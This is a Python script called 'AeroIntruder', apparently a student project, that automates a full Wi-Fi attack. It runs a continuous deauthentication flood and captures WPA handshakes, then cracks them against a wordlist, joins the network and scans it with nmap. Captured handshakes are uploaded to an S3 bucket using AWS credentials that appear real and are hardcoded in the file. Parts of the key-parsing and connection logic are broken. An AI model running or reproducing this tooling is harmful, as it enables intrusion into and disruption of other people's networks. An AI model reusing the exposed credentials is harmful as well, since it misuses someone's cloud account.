import subprocess
import os
import csv
import re
import boto3
from botocore.exceptions import NoCredentialsError

def enable_monitor_mode(interface):
    try:
        subprocess.run(["/usr/bin/sudo", "airmon-ng", "start", interface], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error enabling monitor mode: {e}")

def run_airodump(channel, output_prefix, bssid):
    try:
        enable_monitor_mode("wlan0")
        while True:
            subprocess.run(["/usr/bin/sudo", "airodump-ng", f"-c{channel}", "-w", output_prefix, "-d", bssid, "wlan0mon"], check=True)
    except subprocess.CalledProcessError:
        pass  # Ignore errors and continue running the command

def run_aireplay(bssid):
    try:
        enable_monitor_mode("wlan0")
        while True:
            subprocess.run(["/usr/bin/sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, "wlan0mon"])
    except KeyboardInterrupt:
        print("\nStopping aireplay-ng")
# Add your AWS credentials (replace 'YOUR_ACCESS_KEY' and 'YOUR_SECRET_KEY' with your actual credentials)
AWS_ACCESS_KEY = 'AKIASYC6JSEM4GOM4J4N'
AWS_SECRET_KEY = 'zl2sALYTEPclBLcnvUy3kZsJakeHzi5aIOe0mVnk'
AWS_BUCKET_NAME = 'fyp-aerointruder'

# Create an S3 client
s3 = boto3.client('s3', aws_access_key_id=AWS_ACCESS_KEY, aws_secret_access_key=AWS_SECRET_KEY)

def upload_to_s3(file_path, s3_key):
    try:
        # Upload the file
        s3.upload_file(file_path, AWS_BUCKET_NAME, s3_key)
        print(f"File uploaded to S3: {s3_key}")
    except FileNotFoundError:
        print("The file was not found")
    except NoCredentialsError:
        print("Credentials not available")


# Modify the connect_to_network function
def connect_to_network(bssid, key):
    try:
        # Stop monitor mode before connecting
        subprocess.run(["/usr/bin/sudo", "airmon-ng", "stop", "wlan0mon"])

        # Re-enable the wireless interface
        subprocess.run(["/usr/bin/sudo", "ifconfig", "wlan0", "up"])

        # Connect to the network
        subprocess.run(["/usr/bin/sudo", "iwconfig", "wlan0", "essid", bssid, "key", key])

        # Retrieve the IP address assigned to wlan0
        ip_result = subprocess.run(["/usr/bin/sudo", "ip", "a", "show", "wlan0"], capture_output=True)
        ip_output = ip_result.stdout.decode('utf-8')
        ip_address = re.search(r'inet\s+(\d+\.\d+\.\d+\.\d+)', ip_output)
        
        # Check if IP address is found
        if ip_address:
            ip_address = ip_address.group(1)
            print(f"Connected to the network. IP address: {ip_address}")

            # Restart monitor mode after connecting
            subprocess.run(["/usr/bin/sudo", "airmon-ng", "start", "wlan0"])

            return ip_address
        else:
            print("Failed to retrieve IP address after connecting.")
            return None

    except subprocess.CalledProcessError as e:
        print(f"Error connecting to the network: {e}")
        return None

# Modify the run_nmap_scan_after_crack function
def run_nmap_scan_after_crack(bssid, cap_file, wordlist_path, output_prefix):
    try:
        # Crack the WPA key
        result = subprocess.run(["/usr/bin/sudo", "aircrack-ng", cap_file, "-w", wordlist_path], capture_output=True)
        output = result.stdout.decode('utf-8')
        print(output)

        if 'KEY FOUND!' in output:
            print("KEY FOUND! Connecting to the network and running Nmap scan.")

            # Extract the key from the output (assuming the key is in the format "KEY FOUND: [key]")
            key_start = output.find('KEY FOUND: ') + len('KEY FOUND: ')
            key_end = output.find('\n', key_start)
            key = output[key_start:key_end].strip()

            # Connect to the network and get the assigned IP address
            ip_address = connect_to_network(bssid, key)

            if ip_address:
                # Run Nmap scan on the connected network
                nmap_result = subprocess.run(["/usr/bin/sudo", "nmap", "-oN", f"{output_prefix}_nmap_scan.txt", ip_address], capture_output=True)
                print(nmap_result.stdout.decode('utf-8'))
                print(f"Nmap scan results saved to {output_prefix}_nmap_scan.txt")
        else:
            print("WPA key not found. Unable to connect to the network.")
    except subprocess.CalledProcessError as e:
        print(f"Error cracking WPA key: {e}")



def check_and_crack(output_prefix):
    try:
        while True:
            cap_file = f"{output_prefix}-01.cap"
            if os.path.exists(cap_file):
                print(f"Found capture file {cap_file}")

                # Upload the capture file to S3
                s3_key = f"captures/{output_prefix}-01.cap"  # S3 key where the file will be stored
                upload_to_s3(cap_file, s3_key)

                # Crack the WPA key, connect, and run Nmap scan
                wordlist_path = "/usr/share/wordlists/SecLists/Passwords/WiFi-WPA/probable-v2-wpa-top447.txt"
                bssid = 'your_network_bssid'  # Replace with the actual BSSID
                run_nmap_scan_after_crack(bssid, cap_file, wordlist_path, output_prefix)

                break
    except KeyboardInterrupt:
        print("\nStopping aircrack-ng")

def intro():
    os.system("clear")
    print("""\033[1;31m
---------------------------------------------------------------------------------------
    _                 ___       _                  _           
   / \   ___ _ __ ___|_ _|_ __ | |_ _ __ _   _  __| | ___ _ __ 
  / _ \ / _ \ '__/ _ \| || '_ \| __| '__| | | |/ _` |/ _ \ '__|
 / ___ \  __/ | | (_) | || | | | |_| |  | |_| | (_| |  __/ |   
/_/   \_\___|_|  \___/___|_| |_|\__|_|   \__,_|\__,_|\___|_|   
                                                        Coded By Suleman Rehman
---------------------------------------------------------------------------------------\033[0m""")

def main():
    while True:
        intro()
        print("\033[1;32m\n1. Run airodump-ng")
        print("2. Run aireplay-ng")
        print("3. Crack the captured handshake")
        print("4. Run Nmap scan after cracking")
        print("5. Exit\033[0m")

        choice = input("Enter your choice: ")

        if choice == '1':
            channel = input("Enter the channel: ")
            output_prefix = input("Enter the output prefix: ")
            bssid = input("Enter the BSSID: ")
            run_airodump(channel, output_prefix, bssid)
        elif choice == '2':
            bssid = input("Enter the BSSID: ")
            run_aireplay(bssid)
        elif choice == '3':
            output_prefix = input("Enter the output prefix: ")
            check_and_crack(output_prefix)
        elif choice == '4':
            output_prefix = input("Enter the output prefix: ")
            run_nmap_scan_after_crack(output_prefix, f"{output_prefix}-01.cap", "/usr/share/wordlists/SecLists/Passwords/WiFi-WPA/probable-v2-wpa-top447.txt", output_prefix)


        elif choice == '5':
            print("Exiting the program.")
            break
        else:
            print("Invalid choice. Please try again.")

# (existing code)

if __name__ == "__main__":
    main()
